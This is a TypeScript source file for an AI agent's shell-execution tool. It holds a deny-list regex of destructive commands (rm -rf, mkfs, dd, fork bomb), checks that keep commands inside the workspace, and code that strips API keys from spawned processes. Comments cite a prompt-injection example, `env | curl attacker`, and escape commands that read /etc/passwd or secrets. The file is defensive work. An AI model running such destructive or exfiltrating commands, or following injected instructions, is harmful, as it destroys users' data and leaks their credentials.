import { delimiter, resolve, sep } from "node:path";
import { platform } from "node:os";
import { Tool, type AskPermission } from "./base.js";
import { PROVIDERS } from "../../providers/registry.js";

const IS_WINDOWS = platform() === "win32";

const DENY_PATTERNS = [
  /\brm\s+-[rf]{1,2}\b/i,
  /\bdel\s+\/[fq]\b/i,
  /\brmdir\s+\/s\b/i,
  /(?:^|[;&|]\s*)format\b/i,
  /\b(mkfs|diskpart)\b/i,
  /\bdd\s+if=/i,
  />\s*\/dev\/sd/,
  /\b(shutdown|reboot|poweroff)\b/i,
  /:\(\)\s*\{.*\};\s*:/,
];

const MAX_TIMEOUT = 600;
const MAX_OUTPUT = 10_000;

/**
 * Names of environment variables that carry tarantul's own LLM provider API
 * keys (see providers/registry.ts). OpenAICompatProvider.setupEnv() writes
 * these into process.env so the underlying SDK can read them — which means
 * they're also present in process.env for anything ExecTool spawns. A model
 * can be prompt-injected into running something like `env | curl attacker`,
 * so these are stripped from the child's environment rather than trusting
 * the shell guard below to catch every possible exfiltration command.
 */
const PROVIDER_SECRET_ENV_NAMES = new Set<string>();
for (const p of PROVIDERS) {
  if (p.envKey) PROVIDER_SECRET_ENV_NAMES.add(p.envKey);
  for (const [name] of p.envExtras) PROVIDER_SECRET_ENV_NAMES.add(name);
}

function buildChildEnv(pathAppend: string): Record<string, string | undefined> {
  const env: Record<string, string | undefined> = {};
  for (const [key, value] of Object.entries(process.env)) {
    if (PROVIDER_SECRET_ENV_NAMES.has(key)) continue;
    env[key] = value;
  }
  if (pathAppend) {
    env["PATH"] = (env["PATH"] ?? "") + delimiter + pathAppend;
  }
  return env;
}

function containsPathTraversal(cmd: string): boolean {
  // Matches ".." as a standalone path segment — bounded by whitespace/slash
  // on both sides, or string start/end — catching `cd ..`, `cat ../secret`,
  // `foo/../bar`, etc. The old `../`/`..\\` substring check missed bare
  // `cd ..` (no trailing separator).
  return /(?:^|[\s/\\])\.\.(?:$|[\s/\\])/.test(cmd);
}

function containsUnsafeSubstitution(cmd: string): boolean {
  // Command/process substitution can construct a path at runtime that never
  // appears as literal text in the command (e.g. a printf of escaped bytes
  // spelling out "/etc/passwd"), which the static path scan below can never
  // catch. Block it outright under workspace restriction rather than let it
  // silently defeat that scan.
  return /\$\(|`|<\(|>\(/.test(cmd);
}

function containsVariableExpansion(cmd: string): boolean {
  // Variable expansion smuggles a path past the static scan the same way
  // substitution does: `cat $HOME/.tarantul/config.json` never contains a
  // literal absolute path. It also can't be resolved against process.env,
  // because a variable may be assigned inline in the same command
  // (`X=/etc; cat $X/passwd`) — so block it outright, same policy as above.
  // Special parameters ($1, $?, $$, …) are left alone: they can't name a
  // path chosen by the model, and blocking them would break common awk use.
  return /\$[{A-Za-z_]/.test(cmd);
}

/** True if `resolved` is `dirResolved` itself or strictly inside it. */
function isWithinDir(resolved: string, dirResolved: string): boolean {
  return resolved === dirResolved || resolved.startsWith(dirResolved + sep);
}

export class ExecTool extends Tool {
  override readonly name = "exec";
  override readonly description = "Execute a shell command and return its output. Use with caution.";
  override get exclusive(): boolean { return true; }

  private readonly timeout: number;
  private readonly workingDir: string | null;
  private readonly denyPatterns: RegExp[];
  private readonly allowPatterns: RegExp[];
  private readonly restrictToWorkspace: boolean;
  private readonly pathAppend: string;
  private readonly askPermission: AskPermission | null;

  constructor(opts: {
    timeout?: number;
    workingDir?: string | null;
    denyPatterns?: RegExp[];
    allowPatterns?: RegExp[];
    restrictToWorkspace?: boolean;
    pathAppend?: string;
    askPermission?: AskPermission;
  } = {}) {
    super();
    this.timeout = opts.timeout ?? 60;
    this.workingDir = opts.workingDir ?? null;
    this.denyPatterns = opts.denyPatterns ?? DENY_PATTERNS;
    this.allowPatterns = opts.allowPatterns ?? [];
    this.restrictToWorkspace = opts.restrictToWorkspace ?? false;
    this.pathAppend = opts.pathAppend ?? "";
    this.askPermission = opts.askPermission ?? null;
  }

  readonly parameters = {
    type: "object",
    properties: {
      command: { type: "string", description: "The shell command to execute" },
      working_dir: { type: "string", description: "Optional working directory for the command" },
      timeout: {
        type: "integer",
        description: "Timeout in seconds (default 60, max 600).",
        minimum: 1,
        maximum: 600,
      },
    },
    required: ["command"],
  };

  async execute(params: Record<string, unknown>): Promise<string> {
    const command = String(params["command"] ?? "");
    const workingDir = (params["working_dir"] as string | undefined) ?? this.workingDir ?? process.cwd();
    const timeoutSec = Math.min(Number(params["timeout"] ?? this.timeout), MAX_TIMEOUT);

    const guardError = this.guardCommand(command, workingDir);
    if (guardError) {
      // With an interactive asker wired, a guard block becomes a question to
      // the user instead of a hard deny; approval runs the command as-is.
      if (!this.askPermission) return guardError;
      const approved = await this.askPermission({
        tool: this.name,
        action: command,
        reason: guardError,
      });
      if (!approved) {
        return "Error: The user denied permission to run this command.";
      }
    }

    const env = buildChildEnv(this.pathAppend);

    const shellCmd = IS_WINDOWS ? ["cmd.exe", "/d", "/s", "/c", command] : ["sh", "-c", command];

    const proc = Bun.spawn(shellCmd, {
      cwd: workingDir,
      env,
      stdout: "pipe",
      stderr: "pipe",
      // On POSIX, run as its own process group leader so a timeout can kill
      // the whole tree (e.g. background children spawned by the command),
      // not just the immediate `sh` process. See killTree() below.
      ...(IS_WINDOWS ? {} : { detached: true }),
    });

    let timer: ReturnType<typeof setTimeout> | null = null;
    const timeoutPromise = new Promise<"timeout">((resolve) => {
      timer = setTimeout(() => resolve("timeout"), timeoutSec * 1000);
    });

    const completionPromise = proc.exited.then(async () => {
      const stdout = await new Response(proc.stdout).text();
      const stderr = await new Response(proc.stderr).text();
      return { stdout, stderr, exitCode: proc.exitCode };
    });

    const winner = await Promise.race([completionPromise, timeoutPromise]);
    // Always clear the timer — an uncleared timeout keeps a one-shot CLI
    // invocation's event loop alive for up to `timeoutSec` after the command
    // already finished normally.
    if (timer) clearTimeout(timer);

    if (winner === "timeout") {
      this.killTree(proc);
      return `Error: Command timed out after ${timeoutSec} seconds`;
    }

    const { stdout, stderr, exitCode } = winner;
    const parts: string[] = [];
    if (stdout) parts.push(stdout);
    if (stderr?.trim()) parts.push(`STDERR:\n${stderr}`);
    parts.push(`\nExit code: ${exitCode}`);

    let result = parts.join("\n") || "(no output)";

    if (result.length > MAX_OUTPUT) {
      const half = Math.floor(MAX_OUTPUT / 2);
      result =
        result.slice(0, half) +
        `\n\n... (${result.length - MAX_OUTPUT} chars truncated) ...\n\n` +
        result.slice(-half);
    }

    return result;
  }

  /**
   * Kill a timed-out command and its descendants, not just the immediate
   * `sh`/`cmd.exe` process. On POSIX, the process was spawned detached (its
   * own process group leader), so signalling the negative pid reaches the
   * whole group — including background children the command may have left
   * running (e.g. `sleep 100 &`). Falls back to single-process kill on
   * Windows or if the group signal fails for any reason.
   */
  private killTree(proc: ReturnType<typeof Bun.spawn>): void {
    if (!IS_WINDOWS) {
      try {
        process.kill(-proc.pid, "SIGTERM");
        return;
      } catch {
        // fall through to single-process kill
      }
    }
    proc.kill();
  }

  /**
   * Best-effort safety guard, not a sandbox. This is a regex/text scan over
   * a shell command string handed to `sh -c` — it can catch obvious literal
   * escapes (quoted/absolute paths, `cd` out of the workspace, `..` traversal)
   * but cannot statically resolve anything computed at runtime (variable
   * expansion, `$()`/backtick output, base64/printf-encoded paths, etc.), so
   * it's blocked outright rather than evaluated. If strict isolation matters,
   * this needs an OS-level sandbox or a binary allow-list, not a deny-list.
   */
  private guardCommand(command: string, cwd: string): string | null {
    const lower = command.toLowerCase();

    for (const pattern of this.denyPatterns) {
      if (pattern.test(lower)) {
        return "Error: Command blocked by safety guard (dangerous pattern detected)";
      }
    }

    if (this.allowPatterns.length > 0) {
      if (!this.allowPatterns.some((p) => p.test(lower))) {
        return "Error: Command blocked by safety guard (not in allowlist)";
      }
    }

    if (this.restrictToWorkspace) {
      if (containsPathTraversal(command)) {
        return "Error: Command blocked by safety guard (path traversal detected)";
      }
      if (containsUnsafeSubstitution(command)) {
        return (
          "Error: Command blocked by safety guard " +
          "(command/process substitution is not allowed with workspace restriction enabled)"
        );
      }
      if (containsVariableExpansion(command)) {
        return "Error: Command blocked by safety guard (variable expansion is not allowed with workspace restriction enabled)";
      }

      const cwdResolved = resolve(cwd);
      const candidates = [...this.extractAbsolutePaths(command), ...this.extractCdTargets(command)];
      for (const raw of candidates) {
        try {
          const trimmed = raw.trim().replace(/^~/, process.env["HOME"] ?? "~");
          // Resolve relative to the command's own cwd, not this process's —
          // `cd subdir` needs to land inside the target working directory.
          // Absolute candidates are unaffected: path.resolve() ignores prior
          // args once it hits an absolute one.
          const p = resolve(cwdResolved, trimmed);
          if (!isWithinDir(p, cwdResolved)) {
            return "Error: Command blocked by safety guard (path outside working dir)";
          }
        } catch {
          // ignore
        }
      }
    }

    return null;
  }

  private extractAbsolutePaths(command: string): string[] {
    // Use the capture group, not the full match — the boundary character
    // class matches a leading quote/space that must NOT end up in the
    // extracted path, or a quoted path like `'/etc/passwd'` resolves as
    // relative-to-cwd (starting with `'`) and silently passes the check
    // above instead of being recognized as `/etc/passwd`.
    const posix = [...command.matchAll(/(?:^|[\s|>"'])(\/[^\s"'>;|<]+)/g)].map((m) => m[1]!);
    const home = [...command.matchAll(/(?:^|[\s|>"'])(~[^\s"'>;|<]*)/g)].map((m) => m[1]!);
    return [...posix, ...home].map((s) => s.trim());
  }

  private extractCdTargets(command: string): string[] {
    // Catches `cd <path>` at the start of the command or after a chain
    // operator (`;`, `&&`, `||`, `|`) — the concrete `cd / && cat secrets`
    // escape, which only checking absolute-path tokens never covers.
    return [...command.matchAll(/(?:^|[;&|]\s*)cd\s+(\S+)/g)].map((m) =>
      m[1]!.replace(/^['"]|['"]$/g, ""),
    );
  }
}
